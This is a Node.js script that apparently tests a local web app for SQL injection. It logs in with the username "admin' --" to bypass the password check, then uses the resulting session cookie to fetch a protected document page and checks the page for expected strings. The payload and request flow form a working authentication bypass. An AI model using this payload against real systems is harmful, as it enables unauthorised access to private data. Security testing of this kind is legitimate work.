const http = require('http');

const req = http.request(
  {
    hostname: 'localhost',
    port: 3000,
    path: '/api/login',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
  },
  (res) => {
    const cookie = res.headers['set-cookie'] ? res.headers['set-cookie'][0].split(';')[0] : '';
    console.log('Login cookie:', cookie);

    http.get(
      {
        hostname: 'localhost',
        port: 3000,
        path: '/documents?id=1',
        headers: { Cookie: cookie },
      },
      (dRes) => {
        let b = '';
        dRes.on('data', (c) => (b += c));
        dRes.on('end', () => {
          console.log('Status for /documents?id=1:', dRes.statusCode);
          console.log('Contains Employee Access Policy?', b.includes('Employee Access Policy'));
          console.log('Contains DOCUMENT 01?', b.includes('DOCUMENT 01'));
          console.log('Contains BACK TO DOCUMENTS?', b.includes('BACK TO DOCUMENTS'));
          console.log('Contains docList / OPEN?', b.includes('[ OPEN ]'));
        });
      }
    );
  }
);
req.write(JSON.stringify({ username: "admin' --", password: '123' }));
req.end();
